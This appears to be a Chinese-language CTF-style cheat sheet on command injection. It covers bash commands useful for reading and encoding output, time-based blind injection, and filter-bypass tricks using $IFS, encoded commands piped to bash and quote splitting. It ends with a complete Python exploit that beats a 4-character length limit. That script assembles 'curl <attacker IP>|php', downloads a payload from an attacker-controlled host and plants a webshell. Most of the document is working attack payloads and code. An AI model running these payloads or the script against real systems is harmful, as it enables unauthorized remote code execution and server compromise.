# Arbitrary Code Execution

## Bash环境下的常用命令

输出

```bash
cat
tac
rev
more
head
sleep #盲注
cut
```

编码

```bash
base64
rev
tac
tr
```

符号标记

```bash
| 管道符
> 
<
* 通配符
?
`` 
$
$()
```

环境信息

```bash
env
ps
```

特殊变量

```bash
$IFS
$PWD
```


## 基于时间的命令盲注

```
sleep $(hostname |cut -c 1| tr a 5)
```

## 一些绕过方式

### 空格

```bash
cat<flag //重定向符
cat<>flag //重定向符
cat${IFS}flag //IFS
可能也过滤了{}，用$IFS$1代替：
?ip=127.0.0.1;cat$IFS$1index.php
cat%09flag //其他字符代替
{cat,flag} //{,}
```

### 命令分隔符

```bash
;
%0a
%0d
;
& #简单拼接
| #管道符
&& #前面执行成功后面才会执行
|| #前面执行失败后面才会执行
```

### 敏感字符绕过

- 编码
  
```bash
`echo 'Y2F0Cg==' | base64 -d` flag.txt #base64
echo "63617420666C61672E747874" | xxd -r -p|bash #16进制
```

- 变量拼接

```bash
a=l;b=s;$a$b
```
- 字符绕过

```bash
ca''t fl''ag
cat$@t fl$@ag
ca\t f\lag
```

### RCE 长度限制

- 4字符
```python
#-*-coding:utf8-*-
import  requests as r
from  time  import  sleep
import  random
import  hashlib
target  =  'http://xx.xx.xxx/'
  
# 存放待下载文件的公网主机的IP
shell_ip  =  'xx.xx.xx.xx'
  
# 本机IP
your_ip  =  r.get( 'http://ipv4.icanhazip.com/' ).text.strip()
  
# 将shell_IP转换成十六进制
ip  =  '0x'  +  ''.join([ str ( hex ( int (i))[ 2 :].zfill( 2 ))
                      for  i  in  shell_ip.split( '.' )])
  
reset  =  target  +  '?reset'
cmd  =  target  +  '?cmd='
sandbox  =  target  +  'sandbox/'  +  \
     hashlib.md5( 'orange'  +  your_ip).hexdigest()  +  '/'
  
# payload某些位置的可选字符
pos0  =  random.choice( 'efgh' )
pos1  =  random.choice( 'hkpq' )
pos2  =  'g'   # 随意选择字符
  
payload  =  [
     '>dir' ,
     # 创建名为 dir 的文件
  
     '>%s\>'  %  pos0,
     # 假设pos0选择 f , 创建名为 f> 的文件
  
     '>%st-'  %  pos1,
     # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，
     # 因为alphabetical序中t>s
  
     '>sl' ,
     # 创建名为 >sl 的文件；到此处有四个文件，
     # ls 的结果会是：dir f> kt- sl
  
     '*>v' ,
     # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f> kt- sl`>v ，
     #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f> kt- sl
     # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符
  
     '>rev' ,
     # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f> kt- rev sl v
  
     '*v>%s'  %  pos2,
     # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。
     # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk > f
  
     # 续行分割 curl 0x11223344|php 并逆序写入
     '>p' ,
     '>ph\\' ,
     '>\|\\' ,
     '>%s\\'  %  ip[ 8 : 10 ],
     '>%s\\'  %  ip[ 6 : 8 ],
     '>%s\\'  %  ip[ 4 : 6 ],
     '>%s\\'  %  ip[ 2 : 4 ],
     '>%s\\'  %  ip[ 0 : 2 ],
     '>\ \\' ,
     '>rl\\' ,
     '>cu\\' ,
  
     'sh '  +  pos2,
     # sh g ;g 的内容是 ls -tk > f ，那么就会把逆序的命令反转回来，
     # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行
     'sh '  +  pos0,
     # sh f 执行curl命令，下载文件，写入木马。
]
  
s  =  r.get(reset)
for  i  in  payload:
     assert  len (i) < =  4
     s  =  r.get(cmd  +  i)
     print  '[%d]'  %  s.status_code, s.url
     sleep( 0.1 )
s  =  r.get(sandbox  +  'fun.php?cmd=uname -a' )
print  '[%d]'  %  s.status_code, s.url
print  s.text
```